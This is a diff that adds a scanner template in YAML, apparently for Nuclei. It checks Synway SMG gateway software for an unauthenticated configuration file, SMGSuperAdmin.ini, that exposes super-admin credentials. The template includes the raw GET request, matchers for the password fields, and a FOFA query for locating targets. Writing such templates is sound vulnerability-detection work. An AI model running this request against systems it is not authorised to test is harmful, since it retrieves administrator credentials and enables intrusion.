@@ -1,0 +1,32 @@
+id: Synway-SMGSuperAdmin-Information-disclosure
+
+info:
+  name: "三汇SMG网关管理软件 SMGSuperAdmin 配置文件敏感数据泄露"
+  author: Unknown
+  severity: medium
+  description: |-
+    fofa: app="Synway-网关管理软件"
+    三汇SMG网关管理软件的SMGSuperAdmin组件因配置文件访问控制缺失，导致敏感数据暴露。攻击者可通过未授权访问获取包含用户凭证的系统配置信息，从而实现对目标系统的横向渗透。该漏洞可能引发身份伪装、权限提升及后续恶意操作等安全风险。
+  reference:
+  - https://mp.weixin.qq.com/s/b_eUjbaJmHNh5-NMg_jZ-g?token=968846615&lang=zh_CN
+  tags: 三汇SMG网关管理软件
+
+http:
+- raw:
+  - |
+    GET /Config/SMGSuperAdmin.ini HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '[SuperUserInfo]'
+    - 'SuperUserName='
+    - 'SuperPwd='
+    condition: and
+  - type: status
+    status:
+    - 200
